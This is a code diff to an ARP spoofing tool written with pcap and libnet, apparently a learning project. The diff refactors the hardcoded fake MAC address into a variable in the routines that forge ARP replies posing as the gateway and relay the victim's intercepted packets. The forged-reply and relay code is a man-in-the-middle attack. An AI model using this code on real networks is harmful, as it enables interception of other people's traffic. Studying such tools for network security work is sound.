@@ -28,6 +28,7 @@ typedef struct thread_value
     u_int *sender_value;
     u_int victim_value;
     u_int gateway_value;
+    u_char *virtual_value;
 }thread_value;
 
 void packet_function(int p_type, u_int gateway_func_ip, pcap_t *handle_func, u_int32_t attacker_ip_func, libnet_ether_addr* attacker_mac_func)
@@ -73,6 +74,7 @@ void *packet_handler(void *arg)
     u_int *sender_v = pi -> sender_value;
     u_int victim_v = pi -> victim_value;
     u_int gateway_v = pi -> gateway_value;
+    u_char *virtual_v = pi -> virtual_value;
     char errbuf_th[PCAP_ERRBUF_SIZE];
     pcap_t *handle_th;
 
@@ -89,12 +91,7 @@ void *packet_handler(void *arg)
     custom_arp_hdr* arp_header = (custom_arp_hdr*)(send_buf + sizeof(libnet_ethernet_hdr));
 
     memcpy(eth_header->ether_dhost, sender_v, 6);
-    eth_header->ether_shost[0] = 0x0a;
-    eth_header->ether_shost[1] = 0x0b;
-    eth_header->ether_shost[2] = 0x0c;
-    eth_header->ether_shost[3] = 0x0d;
-    eth_header->ether_shost[4] = 0x0e;
-    eth_header->ether_shost[5] = 0x0f; // virtual attacker mac
+    memcpy(eth_header->ether_shost, virtual_v, 6);
     eth_header->ether_type = htons(ETHERTYPE_ARP);
 
     arp_header->ar_hrd = htons(ARPHRD_ETHER);
@@ -103,12 +100,7 @@ void *packet_handler(void *arg)
     arp_header->ar_pln = 4;
     arp_header->ar_op = htons(ARPOP_REPLY);
 
-    arp_header->ar_sha[0] = 0x0a;
-    arp_header->ar_sha[1] = 0x0b;
-    arp_header->ar_sha[2] = 0x0c;
-    arp_header->ar_sha[3] = 0x0d;
-    arp_header->ar_sha[4] = 0x0e;
-    arp_header->ar_sha[5] = 0x0f; // virtual attacker mac
+    memcpy(arp_header->ar_sha, virtual_v, 6);
     arp_header->ar_sip = gateway_v;
     memcpy(arp_header->ar_tha, sender_v, 6);
     arp_header->ar_tip = victim_v;
@@ -156,6 +148,7 @@ int main(int argc, char **argv)
     char *dev, errbuf[PCAP_ERRBUF_SIZE];
     u_int victim_ip, gateway_ip, receiver_mac[6], sender_mac[6];
     u_int32_t attacker_ip;
+    u_char virtual_mac[6] = {0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};
     libnet_ether_addr* attacker_mac;
     pthread_t packet_threads, recovery_threads;
     thread_value thread_data;
@@ -216,7 +209,12 @@ int main(int argc, char **argv)
 
         if(res_sender == 1){
             if(arp_sdcheck->ar_sip == victim_ip){
-                memcpy(sender_mac, arp_sdcheck->ar_sha, 6);
+                sender_mac[0] = arp_sdcheck->ar_sha[0];
+                sender_mac[1] = arp_sdcheck->ar_sha[1];
+                sender_mac[2] = arp_sdcheck->ar_sha[2];
+                sender_mac[3] = arp_sdcheck->ar_sha[3];
+                sender_mac[4] = arp_sdcheck->ar_sha[4];
+                sender_mac[5] = arp_sdcheck->ar_sha[5]; //memcpy(sender_mac, arp_sdcheck->ar_sha, 6);
 
                 std::cout<<"Find sender mac address\n";
 
@@ -228,6 +226,7 @@ int main(int argc, char **argv)
     thread_data.sender_value = sender_mac;
     thread_data.victim_value = victim_ip;
     thread_data.gateway_value = gateway_ip;
+    thread_data.virtual_value = virtual_mac;
 
     if(RECOVERY_CHECK == 1){
         if(pthread_create(&packet_threads, NULL, packet_handler, (void*)&thread_data) < 0)
@@ -245,7 +244,6 @@ int main(int argc, char **argv)
 
         if(res == -1) break;
         if(res == 1){
-std::cout<<ntohs(eth_check->ether_shost[0])<<std::endl;
             if((eth_check->ether_shost[0] == sender_mac[0]) &&
                     (eth_check->ether_shost[1] == sender_mac[1]) &&
                     (eth_check->ether_shost[2] == sender_mac[2]) &&
@@ -253,12 +251,7 @@ std::cout<<ntohs(eth_check->ether_shost[0])<<std::endl;
                     (eth_check->ether_shost[4] == sender_mac[4]) &&
                     (eth_check->ether_shost[5] == sender_mac[5])){
                 memcpy(eth_check->ether_dhost, receiver_mac, 6);
-                eth_check->ether_shost[0] = 0x0a;
-                eth_check->ether_shost[1] = 0x0b;
-                eth_check->ether_shost[2] = 0x0c;
-                eth_check->ether_shost[3] = 0x0d;
-                eth_check->ether_shost[4] = 0x0e;
-                eth_check->ether_shost[5] = 0x0f; // virtual attacker mac
+                memcpy(eth_check->ether_shost, virtual_mac, 6);
 
                 if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";
 
